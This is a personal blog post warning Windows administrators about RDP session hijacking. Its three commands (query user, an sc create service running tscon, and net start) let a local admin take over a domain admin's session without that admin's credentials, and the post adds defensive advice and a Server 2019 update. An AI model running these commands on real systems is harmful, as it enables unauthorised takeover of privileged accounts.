---
title: 'How Secure is RDP?'
date: 2019-06-23T03:06:00.002-07:00
draft: false
url: /2019/06/hands-up-if-you-have-following.html
---

  

Hands up if you have following setup/practices in your organization:

*   A RDP server (Terminal server) that everyone can jump onto. Apart from the IT admins, some users have local admin rights on the box, just so they can run or configure a particular application.
    
*   To help troubleshooting an issue, your IT admins often RDP to servers directly from user's laptop, which the user is a local admin.
    
*   A group of users have local admin rights on a particular Windows box, and your Domain Admins also need to RDP to from time to time.
    

  

If any of above scenario applies to your organization, you might want to consider introducing some changes. This is why:

  

It is well known that Windows Remote Desktop Service has this feature that allows you to connect to another user's session. But obviously you will need to know the other user's credential to do that, right? No, not necessarily. With NT AUTHORITY/SYSTEM account, you can hijack the user's RDP session without the need for type in the credential. As mentioned in this blog post [https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6](https://doublepulsar.com/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)  If you are a local admin on the server/desktop, you can easily hijack another user's RDP session (whether it's connected or disconnected) by run the following commands:

1.  Query User to get the SEESION Name and ID
    

C:\\Users\\ben>query user

USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME

tom-admin             rdp-tcp#19          4  Active         15  6/22/2019 5:14 AM

\>ben                   rdp-tcp#20          5  Active          .  6/22/2019 6:53 AM

2.  Use SC to create a service which will connect to the privileged account (tom-admin) RDP session from a non-privileged users (Ben) session. The service by default will use SYSTEM account to launch.
    

sc create rdphijack binpath="cmd.exe /k tscon 4 /dest:rdp-tcp#20"

3.  Start the service, and THAT'S IT!!!
    

net start rdphijack

This hack is so easy to achieve, a security novice like me was able to get it going in no time.  
  
Image the follow scenario: Your Domain Admin RDP to a jump/bastion server. He/She left the session there without properly logoff. A hacker compromised a normal domain user account. The account somehow has local admin rights on this server. The hacker will then be able to easily connect to the Domain Admin's session, without the need for any 3rd party tools! The worst thing is, this kind of hijack will not trigger any alarms in solutions like ATA.

  

I know there are also lots people still arguing whether this is an issue. I think the point is with this kind of flaw in place, we really need to avoid those scenario I mentioned in the beginning. As they can easily lead to a compromised DA account. RDP from the beginning isn't a very secure way of accessing servers. As a IT Admin, we should try minimize the use of it. Luckily, we now have System Admin Center. With that we can accomplish a lot admin tasks without the need of RDP to the remote servers.

  

On the other hand, I would love to hear your opinion or experience with System Admin Center. I am not aware of any security issues with the tool. But be sure do let me know if you know otherwise.

  

**Update:** I have tested this issue on Windows 2019 and was not able to replicate it. So here you go, just upgrade all your servers to 2019!